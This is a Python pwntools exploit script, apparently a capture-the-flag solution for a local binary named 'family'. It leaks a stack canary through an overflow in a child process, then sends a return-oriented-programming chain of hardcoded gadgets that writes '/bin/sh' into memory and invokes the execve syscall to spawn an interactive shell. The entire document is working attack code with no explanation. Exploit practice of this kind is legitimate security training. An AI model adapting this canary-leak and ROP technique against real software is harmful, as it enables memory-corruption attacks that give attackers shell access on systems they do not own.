from pwn import *
context.arch = 'amd64'

context.terminal = ['tmux', 'splitw', '-h']
r = process('./family')
gdb.attach(r)

'''some addr'''
read_addr = 0x400c04
#read_addr = 0x400bf8
bin_sh = 0x6b7050

'''rop gadgets'''
pop_rdi = 0x400696
pop_rsi = 0x40402e
pop_rdx = 0x44a085
pop_rax = 0x44a02c
ret = 0x4001c4
syscall = 0x4012bc
mov_mrdi_rsi = 0x4473fb

'''child'''
r.recvuntil('Where is my daddy QQ\n')
r.send('a'*0x19)
r.recv(0x19)
canary = b'\x00' + r.recv(7)
print(f'canary leak : {hex(u64(canary, endian="little"))}')

'''parent'''
r.recvuntil('?')
#payload1 = flat('b'*24, canary, bin_sh+0x20, read_addr)
#payload1 = flat('b'*24, canary, 'c'*8, 'b'*8)
payload1 = flat('b'*24, canary, 'c'*8, pop_rdi, bin_sh, pop_rsi, '/bin/sh\0', mov_mrdi_rsi, pop_rsi, 0x0, pop_rdx, 0x0, pop_rax, 0x3b, syscall)
r.send(payload1)

r.interactive()
